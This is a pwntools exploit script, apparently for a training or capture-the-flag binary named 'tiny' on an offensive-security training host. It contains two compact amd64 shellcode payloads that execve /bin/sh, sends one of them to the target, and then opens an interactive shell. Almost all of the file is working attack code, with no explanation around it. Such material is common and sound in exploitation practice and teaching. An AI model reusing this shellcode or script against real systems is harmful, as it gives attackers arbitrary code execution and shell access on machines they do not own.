from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']


if "REM" in args:
        r = remote("tiny.training.offensivedefensive.it", 8080, ssl=True)

else:
        r = process("./tiny")
        gdb.attach(r,'''
                b main
                c
                ''')
        input("wait")


context.arch = "amd64"

asm_code = """
push rdx
pop rax
add al, 0x10
push rax
pop rdi
xor eax, eax
mov al, 0x3b
xor edx, edx
xor esi, esi
syscall
.string "/bin/sh"
"""

# Second way with open input and send /bin/sh
asm_code2 = """
push 0
pop rax
push 0
pop rdi
push rdx
pop rsi
push 8
pop rdx
syscall
nop
push rsi
pop rdi
push 0
pop rsi
push 0
pop rdx
push 0x3b
pop rax
syscall
"""

r.recvuntil("> ")
r.sendline(asm(asm_code))

#r.send(b"/bin/sh\0") # Use with sellcode 2

r.interactive()